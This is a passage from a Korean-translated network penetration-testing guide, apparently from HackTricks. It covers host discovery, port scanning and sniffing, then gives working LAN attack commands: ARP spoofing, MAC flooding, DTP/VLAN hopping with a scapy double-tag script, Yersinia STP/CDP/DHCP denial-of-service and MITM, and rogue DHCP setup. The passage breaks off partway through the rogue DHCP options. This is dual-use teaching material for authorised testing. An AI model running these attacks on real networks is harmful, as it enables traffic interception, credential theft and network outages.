# Pentesting 네트워크

{{#include ../../banners/hacktricks-training.md}}



## 외부에서 호스트 발견하기

이것은 **간단한 섹션**으로, **인터넷**에서 **응답하는 IP**를 찾는 방법에 관한 내용입니다.\
이 상황에서는 일부 **IP의 범위**(아마 여러 **범위**가 있을 수도 있음)가 주어져 있고, **어떤 IP들이 응답하는지** 찾아야 합니다.

### ICMP

호스트가 올라와 있는지 여부를 알아내는 가장 **쉽고** **빠른** 방법입니다.\
몇몇 **ICMP** 패킷을 보내고 **응답을 기대**해볼 수 있습니다. 가장 쉬운 방법은 단순히 **echo request**를 보내고 응답을 기다리는 것입니다. 간단한 `ping`을 사용하거나 `fping`으로 **범위**를 검사할 수 있습니다.\
또한 **nmap**을 사용해 다른 유형의 ICMP 패킷을 보낼 수 있습니다(이렇게 하면 일반적인 ICMP echo request-response에 대한 필터를 회피할 수 있습니다).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

모든 종류의 ICMP 패킷이 필터링되는 경우가 매우 흔하다. 그러면 host가 up인지 확인하기 위해 할 수 있는 것은 open ports를 찾는 것이다. 각 host는 65535 ports를 가지고 있으므로, 만약 "big" scope가 있다면 모든 host의 각 port가 열려 있는지 테스트할 수 없다, 너무 많은 시간이 걸린다.\\
그러므로 필요한 것은 fast port scanner ([masscan](https://github.com/robertdavidgraham/masscan))와 더 많이 사용되는 ports 목록이다:
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
`nmap`으로도 이 단계를 수행할 수 있지만, 더 느리고 다소 `nmap`이 호스트의 가동 여부를 식별하는 데 문제가 있습니다.

### HTTP 포트 검색

이는 TCP 포트 검색으로, **HTTP 발견에 집중**하고자 할 때 **서비스**를 찾는 데 유용합니다:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

또한 일부 **UDP port open** 여부를 확인하여 특정 **host**에 **더 주의를 기울여야 하는지** 판단할 수 있습니다.  
UDP services는 일반적으로 regular empty UDP probe packet에 대해 **응답하지 않으며**, **어떤 데이터도** 반환하지 않기 때문에 해당 포트가 filtered인지 open인지 판단하기 어렵습니다.  
이를 판단하는 가장 쉬운 방법은 실행 중인 service와 관련된 packet을 보내보는 것이며, 어떤 service가 동작하는지 모를 경우 port number를 기준으로 가장 가능성 높은 것을 시도해보세요:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
앞서 제안한 nmap 명령은 해당 **/24** 범위 내 모든 호스트의 **top 1000 UDP ports**를 테스트하지만, 이 작업만으로도 **>20min**가 소요됩니다. 가장 **빠른 결과**가 필요하면 [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)를 사용할 수 있습니다: `./udp-proto-scanner.pl 199.66.11.53/24` 이것은 다음의 **UDP probes**를 해당 **expected port**로 전송합니다( /24 범위의 경우 약 1분 소요): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

여기에는 작성 시점에 잘 알려진 모든 Wifi 공격에 대한 좋은 가이드를 확인할 수 있습니다:


{{#ref}}
../pentesting-wifi/
{{#endref}}

## 내부에서 hosts 발견

네트워크 내부에 있다면 가장 먼저 하고 싶은 일 중 하나는 **다른 hosts를 발견**하는 것입니다. 어느 정도의 **noise**를 발생시킬 수/원하는지에 따라 수행할 수 있는 행동이 달라집니다:

### 수동

연결된 네트워크 내부에서 hosts를 수동적으로 발견하기 위해 다음 도구들을 사용할 수 있습니다:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Active

[_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside)에 언급된 기술들 (_TCP/HTTP/UDP/SCTP Port Discovery_)은 여기에도 **적용할 수 있습니다**.\
하지만 다른 호스트들과 **같은 네트워크**에 있으므로, **더 많은 작업**을 수행할 수 있습니다:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### 활성 ICMP

_외부에서 호스트 발견하기_ ([_**ICMP**_](#icmp))에서 설명된 기법들은 **여기에도 적용할 수 있습니다**.\
하지만 다른 호스트들과 **같은 네트워크**에 있기 때문에, **더 많은 작업**을 할 수 있습니다:

- 서브넷 브로드캐스트 주소에 **ping**을 보내면, ping이 **각 호스트**에 도달하고 이들이 **당신에게 응답**할 수 있습니다: `ping -b 10.10.5.255`
- 네트워크 브로드캐스트 주소로 **ping**을 보내면 **다른 서브넷**에 있는 호스트도 찾을 수 있습니다: `ping -b 255.255.255.255`
- `nmap`의 `-PE`, `-PP`, `-PM` 플래그를 사용하여 각각 **ICMPv4 echo**, **timestamp**, 그리고 **subnet mask requests**를 전송해 호스트 검색을 수행합니다: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan은 네트워크 메시지를 통해 컴퓨터를 **켜는 데** 사용됩니다. 컴퓨터를 켜는 데 사용되는 매직 패킷은 **MAC Dst**가 포함된 패킷으로, 동일한 패킷 안에서 그 값이 **16번 반복**됩니다.\
이러한 패킷은 보통 **ethernet 0x0842** 또는 **UDP packet to port 9**로 전송됩니다.\
만약 **no \[MAC]**가 제공되지 않으면, 패킷은 **broadcast ethernet**으로 전송됩니다(그리고 브로드캐스트 MAC이 반복되는 값이 됩니다).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## 호스트 스캔

심층적으로 스캔하려는 모든 IP(외부 또는 내부)를 발견한 후에는 다양한 작업을 수행할 수 있다.

### TCP

- **열린** 포트: _SYN --> SYN/ACK --> RST_
- **닫힌** 포트: _SYN --> RST/ACK_
- **필터된** 포트: _SYN --> \[NO RESPONSE]_
- **필터된** 포트: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

UDP 포트를 스캔하는 방법은 두 가지가 있다:

- **UDP packet**를 보내고 포트가 **closed**일 경우 응답으로 _**ICMP unreachable**_를 확인한다 (몇몇 경우 ICMP는 **filtered**될 수 있어 포트가 closed인지 open인지에 대한 정보를 받지 못한다).
- **formatted datagrams**를 보내 특정 **service**(예: DNS, DHCP, TFTP 등, _nmap-payloads_에 나열된 것들)로부터 응답을 유도한다. **response**를 받으면 해당 포트는 **open**이다.

**Nmap**은 "-sV"를 사용해 두 가지 방법을 혼합한다(UDP 스캔은 매우 느리다). 하지만 UDP 스캔은 TCP 스캔보다 느리다:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)**는 **TCP (Transmission Control Protocol)** 및 **UDP (User Datagram Protocol)**와 함께 사용되도록 설계되었습니다. 그 주요 목적은 IP 네트워크에서 전화 통신 데이터를 전송하는 것을 용이하게 하며, **Signaling System 7 (SS7)**에서 볼 수 있는 많은 신뢰성 기능을 반영합니다. **SCTP**는 **SIGTRAN** 프로토콜 계열의 핵심 구성요소로, SS7 신호를 IP 네트워크로 전송하는 것을 목표로 합니다.

**SCTP**에 대한 지원은 **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, **VxWorks** 등 다양한 운영체제에서 제공되며, 이는 통신 및 네트워킹 분야에서 널리 채택되고 유용하다는 것을 보여줍니다.

nmap은 SCTP에 대해 두 가지 서로 다른 스캔을 제공합니다: _-sY_ 및 _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS 및 IPS 우회


{{#ref}}
ids-evasion.md
{{#endref}}

### **추가 nmap 옵션**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### 내부 IP 주소 확인

**Misconfigured routers, firewalls, and network devices**는 때때로 **nonpublic source addresses**를 소스로 사용하여 network probes에 응답합니다. **tcpdump**는 테스트 중에 사설 주소로부터 수신된 패킷을 식별하는 데 사용할 수 있습니다. 구체적으로 Kali Linux에서는 퍼블릭 인터넷에서 접근 가능한 **eth2 interface**에서 패킷을 캡처할 수 있습니다. 설정이 NAT 또는 Firewall 뒤에 있는 경우 이러한 패킷은 필터링될 가능성이 높다는 점에 유의해야 합니다.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing을 통해 캡처된 frames와 packets를 검토하여 IP ranges, subnet sizes, MAC addresses 및 hostnames 등의 세부 정보를 알 수 있습니다. 네트워크가 잘못 구성되어 있거나 switching fabric이 과부하 상태이면 공격자는 passive network sniffing을 통해 민감한 정보를 캡처할 수 있습니다.

스위치된 Ethernet 네트워크가 제대로 구성되어 있다면, 오직 broadcast frames와 당신의 MAC address로 향하는 트래픽만 보입니다.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
또한 SSH 세션을 통해 원격 머신의 패킷을 Wireshark를 GUI로 사용하여 실시간으로 캡처할 수 있다.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

당연히.

### Capturing credentials

pcap 또는 live interface에서 자격 증명을 파싱하기 위해 [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) 같은 도구를 사용할 수 있습니다.

## LAN attacks

### ARP spoofing

ARP Spoofing은 gratuitous ARPResponses를 보내 특정 머신의 IP가 우리 장치의 MAC을 가지고 있다고 알리는 공격입니다. 그러면 피해자는 ARP 테이블을 변경하고, 그 spoofed IP에 접속하려 할 때마다 우리 장치로 통신하게 됩니다.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

스위치의 CAM table을 오버플로우시키기 위해 서로 다른 source mac address를 가진 많은 패킷을 전송한다. CAM table이 가득 차면 스위치는 hub처럼 동작하기 시작하여 모든 트래픽을 브로드캐스트한다.
```bash
macof -i <interface>
```
최신 스위치에서는 이 취약점이 수정되었습니다.

### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

The **Dynamic Trunking Protocol (DTP)**은 트렁킹을 자동화하기 위해 설계된 링크 계층 프로토콜로, 스위치가 포트를 Trunk 모드 또는 비트렁크(non-trunk) 모드로 자동으로 선택할 수 있게 합니다. **DTP**의 사용은 종종 최적이 아닌 네트워크 설계를 나타내므로, 트렁크는 필요한 곳에서만 수동으로 구성하고 적절히 문서화하는 것이 중요합니다.

기본적으로 스위치 포트는 Dynamic Auto 모드로 설정되어 있어 인접 스위치의 신호가 있으면 트렁킹을 시작할 준비가 되어 있습니다. pentester나 공격자가 스위치에 연결해 DTP Desirable frame을 전송하면 포트가 강제로 Trunk 모드로 전환될 수 있다는 점이 보안 문제입니다. 이로 인해 공격자는 STP frame 분석을 통해 VLANs를 열거하고 가상 인터페이스를 설정하여 VLAN 분할을 우회할 수 있습니다.

많은 스위치에서 기본적으로 DTP가 활성화되어 있는 것은 공격자가 스위치 행세를 하여 모든 VLANs의 트래픽에 접근할 수 있게 악용될 수 있습니다. [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) 스크립트는 인터페이스를 모니터링하여 스위치가 Default, Trunk, Dynamic, Auto, 또는 Access 모드 중 어느 상태인지 보여줍니다. 이 중 Access 모드만이 VLAN hopping attacks에 면역입니다. 이 도구는 스위치의 취약성 상태를 평가합니다.

네트워크 취약점이 확인되면, _**Yersinia**_ 툴을 사용해 DTP 프로토콜을 통해 "enable trunking"을 수행하여 모든 VLANs의 패킷을 관찰할 수 있습니다.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

VLAN을 열거하기 위해서는 [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)을(를) 사용해 DTP Desirable 프레임을 생성하는 것도 가능합니다. 어떤 경우에도 스크립트를 중단하지 마십시오. 이 스크립트는 3초마다 DTP Desirable을 주입합니다. **스위치에서 동적으로 생성된 trunk 채널은 5분 동안만 유지됩니다. 5분 후에는 trunk가 사라집니다.**
```
sudo python3 DTPHijacking.py --interface eth0
```
언급하자면 **Access/Desirable (0x03)** 은 DTP 프레임이 Desirable 타입임을 나타내며, 포트가 Trunk 모드로 전환되도록 지시합니다. 그리고 **802.1Q/802.1Q (0xa5)** 은 **802.1Q** 캡슐화 타입을 나타냅니다.

STP 프레임을 분석함으로써, **VLAN 30과 VLAN 60의 존재를 알 수 있습니다.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### 특정 VLAN 공격

VLAN ID와 IP 값을 알게 되면, **가상 인터페이스를 구성하여 특정 VLAN을 공격할 수 있습니다**.\
DHCP가 사용 불가능한 경우 _ifconfig_를 사용하여 정적 IP 주소를 설정하세요.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

논의된 공격인 **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** other VLANs는 도구: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)에 의해 **자동으로 수행**됩니다.

#### Double Tagging

If an attacker knows the value of the **MAC, IP and VLAN ID of the victim host**, he could try to **double tag a frame** with its designated VLAN and the VLAN of the victim and send a packet. As the **victim won't be able to connect back** with the attacker, so the **best option for the attacker is communicate via UDP** to protocols that can perform some interesting actions (like SNMP).

Another option for the attacker is to launch a **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (probably through internet). Then, the attacker could sniff in the second host owned by him if it receives some packets from the victim.

![](<../../images/image (190).png>)

To perform this attack you could use scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

직접 연결된 스위치에 **접근 권한이 있는 경우**, 네트워크 내에서 **VLAN segmentation을 우회**할 수 있습니다. 단순히 포트를 **trunk 모드**로 전환하고 대상 VLAN ID로 가상 인터페이스를 생성한 뒤 IP 주소를 설정하면 됩니다. 주소는 동적으로 요청(DHCP)하거나 정적으로 설정할 수 있으며 상황에 따라 다릅니다.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

게스트 무선 네트워크와 같은 특정 환경에서는 무선 액세스 포인트에 연결된 클라이언트들이 서로 직접 통신하지 못하도록 **port isolation(일명 private VLAN)** 설정이 적용됩니다. 하지만 이러한 격리 조치를 우회할 수 있는 기법이 확인되었습니다. 이 기법은 네트워크 ACL이 없거나 잘못 구성된 점을 악용하여 IP 패킷이 라우터를 통해 동일 네트워크의 다른 클라이언트로 전달되도록 합니다.

공격은 대상 클라이언트의 IP 주소를 포함하지만 라우터의 MAC 주소를 가진 패킷을 생성함으로써 수행됩니다. 이렇게 하면 라우터가 패킷을 잘못 판단하여 대상 클라이언트로 전달하게 됩니다. 이 접근법은 Double Tagging Attacks에서 사용되는 방식과 유사하며, 피해자에게 접근 가능한 호스트를 제어할 수 있는 능력을 이용해 보안 취약점을 악용합니다.

공격의 주요 단계:

1. **패킷 제작:** 대상 클라이언트의 IP 주소를 포함하되 라우터의 MAC 주소를 가진 패킷을 특별히 제작합니다.
2. **라우터 동작 악용:** 제작된 패킷을 라우터로 전송하면, 구성에 따라 라우터가 해당 패킷을 대상 클라이언트로 리디렉션하여 private VLAN 설정으로 제공되는 격리를 우회합니다.

### VTP Attacks

VTP(VLAN Trunking Protocol)는 VLAN 관리를 중앙화합니다. VTP는 VLAN 데이터베이스 무결성을 유지하기 위해 revision number를 사용하며, 변경이 발생할 때마다 이 번호가 증가합니다. 스위치들은 더 높은 revision number를 가진 구성을 수용하여 자신의 VLAN 데이터베이스를 업데이트합니다.

#### VTP Domain Roles

- **VTP Server:** VLAN을 관리합니다—생성, 삭제, 수정. 도메인 멤버들에게 VTP announcements를 브로드캐스트합니다.
- **VTP Client:** VTP announcements를 받아 VLAN 데이터베이스를 동기화합니다. 이 역할은 로컬 VLAN 구성 변경이 제한됩니다.
- **VTP Transparent:** VTP 업데이트에 참여하지 않지만 VTP announcements를 전달합니다. VTP 공격의 영향을 받지 않으며 항상 revision number는 0으로 유지됩니다.

#### VTP Advertisement Types

- **Summary Advertisement:** VTP server가 300초마다 브로드캐스트하며 도메인에 대한 필수 정보를 담고 있습니다.
- **Subset Advertisement:** VLAN 구성 변경 후에 전송됩니다.
- **Advertisement Request:** 보통 더 높은 configuration revision number를 감지한 VTP client가 Summary Advertisement를 요청하기 위해 발행합니다.

VTP 취약점은 VTP announcements가 trunk 포트를 통해서만 순환하기 때문에 오직 trunk 포트를 통해서만 악용될 수 있습니다. DTP 공격 이후 시나리오에서는 VTP로 전환될 가능성이 있습니다. Yersinia와 같은 도구는 VTP 공격을 수행하는 데 사용될 수 있으며, VLAN database를 삭제하여 네트워크를 효과적으로 방해하는 것을 목표로 합니다.

Note: This discussion pertains to VTP version 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
In Yersinia의 그래픽 모드에서 'deleting all VTP vlans' 옵션을 선택하여 VLAN database를 정리하세요.

### STP 공격

**인터페이스에서 BPDU 프레임을 캡처할 수 없다면 STP 공격에 성공할 가능성은 낮습니다.**

#### **STP BPDU DoS**

많은 BPDUs—TCP (Topology Change Notification) 또는 Conf(토폴로지가 생성될 때 전송되는 BPDU)를 전송하면 스위치가 과부하되어 정상적으로 동작하지 않게 됩니다.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

TCP가 전송되면, switches의 CAM table은 15s 후에 삭제됩니다. 그런 다음, 이러한 종류의 packets를 지속적으로 전송하면 CAM table은 계속해서 재시작됩니다(또는 매 15segs마다), 그리고 재시작될 때 switch는 hub처럼 동작합니다.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

공격자는 switch의 동작을 가장해 네트워크의 STP root가 됩니다. 그러면 더 많은 데이터가 그를 통해 통과하게 됩니다. 이는 당신이 두 개의 서로 다른 switch에 연결되어 있을 때 흥미롭습니다.\
이는 BPDUs CONF packets를 전송하여 **priority** 값이 실제 root switch의 priority보다 낮다고 알리는 방식으로 수행됩니다.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**공격자가 2개의 스위치에 연결되어 있으면 새로운 트리의 root가 될 수 있고, 그 스위치들 사이의 모든 트래픽은 그를 통해 지나간다** (MITM attack가 수행된다).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP 공격

CISCO Discovery Protocol (CDP)은 CISCO 장치 간 통신에 필수적이며, 서로를 **식별하고 구성 세부정보를 공유**할 수 있게 합니다.

#### 수동 데이터 수집 <a href="#id-0e0f" id="id-0e0f"></a>

CDP는 모든 포트를 통해 정보를 브로드캐스트하도록 구성되어 있어 보안 위험을 초래할 수 있습니다. 공격자는 스위치 포트에 연결한 뒤 **Wireshark**, **tcpdump**, 또는 **Yersinia** 같은 네트워크 스니퍼를 실행할 수 있습니다. 이로 인해 네트워크 장비의 모델과 실행 중인 Cisco IOS 버전 등 민감한 정보가 드러날 수 있습니다. 공격자는 식별된 Cisco IOS 버전의 특정 취약점을 노릴 수 있습니다.

#### CDP 테이블 플러딩 유발 <a href="#id-0d6a" id="id-0d6a"></a>

보다 공격적인 접근법은 합법적인 CISCO 장치인 것처럼 가장하여 스위치의 메모리를 과부하시켜 Denial of Service (DoS) 공격을 실행하는 것입니다. 아래는 테스트용 네트워크 도구인 Yersinia를 사용해 이러한 공격을 시작하는 명령 시퀀스입니다:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
이 공격 동안 스위치의 CPU와 CDP neighbor table에 큰 부담이 발생하여 과도한 자원 소비로 인해 흔히 **“네트워크 마비”**라고 불리는 상태로 이어집니다.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### VoIP 공격 및 VoIP Hopper 도구

VoIP 전화기는 IoT 장치와 점점 더 통합되어 특수 전화번호를 통해 문을 열거나 온도 조절기를 제어하는 등의 기능을 제공합니다. 그러나 이러한 통합은 보안 위험을 초래할 수 있습니다.

도구 [**voiphopper**](http://voiphopper.sourceforge.net) 는 다양한 환경(Cisco, Avaya, Nortel, Alcatel-Lucent)에서 VoIP 전화를 에뮬레이트하도록 설계되었습니다. CDP, DHCP, LLDP-MED, 802.1Q ARP와 같은 프로토콜을 사용해 음성 네트워크의 VLAN ID를 검색합니다.

**VoIP Hopper**는 Cisco Discovery Protocol (CDP)에 대해 세 가지 모드를 제공합니다:

1. **Sniff Mode** (`-c 0`): VLAN ID를 식별하기 위해 네트워크 패킷을 분석합니다.
2. **Spoof Mode** (`-c 1`): 실제 VoIP 장치의 패킷을 모방하는 맞춤형 패킷을 생성합니다.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): 특정 Cisco IP 전화 모델과 동일한 패킷을 전송합니다.

속도를 위해 선호되는 모드는 세 번째 모드입니다. 이 모드는 다음을 지정해야 합니다:

- 공격자의 네트워크 인터페이스(`-i` 파라미터).
- 에뮬레이트할 VoIP 장치의 이름(`-E` 파라미터), Cisco 명명 형식(예: SEP 다음에 MAC 주소)을 따릅니다.

기업 환경에서는 기존 VoIP 장치를 모방하기 위해 다음을 수행할 수 있습니다:

- 전화기의 MAC 라벨을 확인합니다.
- 전화기의 디스플레이 설정을 통해 모델 정보를 확인합니다.
- VoIP 장치를 노트북에 연결하고 Wireshark로 CDP 요청을 관찰합니다.

세 번째 모드로 도구를 실행하는 예시 명령은 다음과 같습니다:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP 공격

#### Enumeration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**두 가지 유형의 DoS**는 DHCP 서버에 대해 수행될 수 있다. 첫 번째 방법은 **모든 가능한 IP 주소를 사용하도록 충분한 수의 가짜 호스트를 시뮬레이션하는 것**이다.\
이 공격은 DHCP 서버의 응답을 볼 수 있고 프로토콜(**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server))을 완료할 수 있을 때만 작동한다. 예를 들어, 이것은 **Wifi networks에서는 불가능하다**.

또 다른 DHCP DoS 수행 방법은 **모든 가능한 IP를 소스 주소로 사용한 DHCP-RELEASE 패킷을 보내는 것**이다. 그러면 서버는 모든 사용자가 해당 IP 사용을 종료했다고 생각하게 된다.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
이 작업을 보다 자동화된 방식으로 수행하려면 도구 [DHCPing](https://github.com/kamorin/DHCPig)를 사용할 수 있습니다.

앞서 언급한 DoS 공격을 사용해 클라이언트가 환경 내에서 새로운 임대(lease)를 받도록 강제하고, 합법적인 서버들을 고갈시켜 응답하지 않게 만들 수 있습니다. 합법적인 서버가 다시 연결을 시도할 때, **다음 공격에서 언급된 악성 값을 제공할 수 있습니다**.

#### 악성 값 설정

A rogue DHCP server는 `/usr/share/responder/DHCP.py`에 있는 DHCP 스크립트로 설정할 수 있습니다. 이는 트래픽을 악성 서버로 리다이렉트하여 HTTP 트래픽과 자격 증명을 캡처하는 등 네트워크 공격에 유용합니다. 다만 rogue gateway를 설정하는 것은 덜 효과적입니다. 이는 클라이언트의 아웃바운드 트래픽만 캡처할 수 있어 실제 gateway의 응답을 놓치기 때문입니다. 대신 더 효과적인 공격을 위해 rogue DNS 또는 WPAD 서버를 설정하는 것이 권장됩니다.

다음은 rogue DHCP 서버를 구성하기 위한 명령 옵션입니다:

- **Our IP Address (Gateway Advertisement)**: `-i 10.0.0.100`을 사용해 당신 머신의 IP를 gateway로 광고합니다.
